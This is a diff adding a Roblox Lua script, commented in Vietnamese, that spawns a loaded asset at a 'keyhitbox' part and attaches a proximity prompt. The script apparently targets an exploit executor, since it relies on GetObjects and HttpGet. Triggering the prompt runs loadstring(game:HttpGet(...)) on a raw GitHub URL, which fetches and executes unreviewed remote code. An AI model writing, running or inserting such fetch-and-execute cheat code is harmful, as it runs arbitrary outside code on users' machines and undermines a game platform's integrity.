@@ -1,0 +1,90 @@
+-- LocalScript TEST spawn shadow at keyhitbox (NO %)
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- load asset
+local shadow = game:GetObjects("rbxassetid://11631916882")[1]
+if not shadow then
+	warn("Không load được shadow asset")
+	return
+end
+
+-- tìm keyhitbox trong toàn game
+local function findKeyHitbox()
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if obj:IsA("BasePart") and obj.Name:lower() == "keyhitbox" then
+			return obj
+		end
+	end
+	return nil
+end
+
+-- spawn shadow tại keyhitbox
+local function spawnShadow()
+	local keyhitbox = findKeyHitbox()
+	if not keyhitbox then
+		warn("Không tìm thấy keyhitbox trong workspace")
+		return
+	end
+
+	local clone = shadow:Clone()
+	clone.Parent = workspace
+
+	-- tìm Handle
+	local handle = clone:FindFirstChild("Handle", true)
+	if not handle then
+		handle = clone:FindFirstChildWhichIsA("BasePart", true)
+	end
+
+	if not handle then
+		warn("Shadow không có Handle/BasePart")
+		return
+	end
+
+	-- set primary part
+	if not clone.PrimaryPart then
+		clone.PrimaryPart = handle
+	end
+
+	-- đặt đúng vị trí keyhitbox
+	clone:SetPrimaryPartCFrame(CFrame.new(keyhitbox.Position))
+
+	-- cố định vật lý
+	for _, p in ipairs(clone:GetDescendants()) do
+		if p:IsA("BasePart") then
+			p.Anchored = true
+			p.CanCollide = false
+		end
+	end
+
+	-- add ProximityPrompt
+	local prompt = Instance.new("ProximityPrompt")
+	prompt.ActionText = "Test Activate"
+	prompt.ObjectText = "Shadow"
+	prompt.MaxActivationDistance = 5
+	prompt.HoldDuration = 3
+	prompt.RequiresLineOfSight = false
+	prompt.Parent = handle
+
+	prompt.Triggered:Connect(function()
+		print("Prompt triggered!")
+		pcall(function()
+			loadstring(game:HttpGet(
+				"https://raw.githubusercontent.com/eoyoustme/back/refs/heads/main/cruc"
+			))()
+		end)
+	end)
+end
+
+-- bấm phím B để test
+UserInputService.InputBegan:Connect(function(input, gpe)
+	if gpe then return end
+	if input.KeyCode == Enum.KeyCode.B then
+		spawnShadow()
+	end
+end)
+
+print("[TEST] Press B to spawn Shadow at keyhitbox")
